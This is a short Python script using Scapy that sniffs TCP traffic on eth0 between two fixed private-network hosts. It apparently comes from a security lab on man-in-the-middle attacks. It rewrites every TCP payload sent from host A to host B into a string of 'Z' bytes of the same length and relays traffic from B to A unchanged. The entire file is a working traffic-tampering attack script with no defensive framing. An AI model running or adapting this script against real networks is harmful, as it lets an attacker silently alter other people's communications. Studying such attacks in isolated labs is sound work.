#!/usr/bin/env python3
from scapy.all import *

# Define IP addresses and MAC addresses
IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"

def inject_Zs(pkt):
    # Check if the packet is from A to B
    if pkt.haslayer(IP) and pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
        # Create a new packet based on the captured one
        new_pkt = IP(bytes(pkt[IP]))

        # Delete checksums in IP and TCP headers
        del new_pkt[IP].chksum
        del new_pkt[TCP].chksum

        # Delete the original TCP payload
        del new_pkt[TCP].payload

        # Construct the new payload based on the old payload
        if pkt[TCP].payload:
            new_payload = b'Z' * len(pkt[TCP].payload)
            send(new_pkt/new_payload)
        else:
            send(new_pkt)
    # Check if the packet is from B to A
    elif pkt.haslayer(IP) and pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        # Create a new packet based on the captured one
        new_pkt = IP(bytes(pkt[IP]))

        # Delete checksums in IP and TCP headers
        del new_pkt[IP].chksum
        del new_pkt[TCP].chksum

        # Send the new packet without any modification
        send(new_pkt)

# Set the packet filter to capture TCP packets
pkt_filter = 'tcp'

# Start capturing packets on the eth0 interface and pass them to the inject_Zs function
sniff(iface='eth0', filter=pkt_filter, prn=inject_Zs)
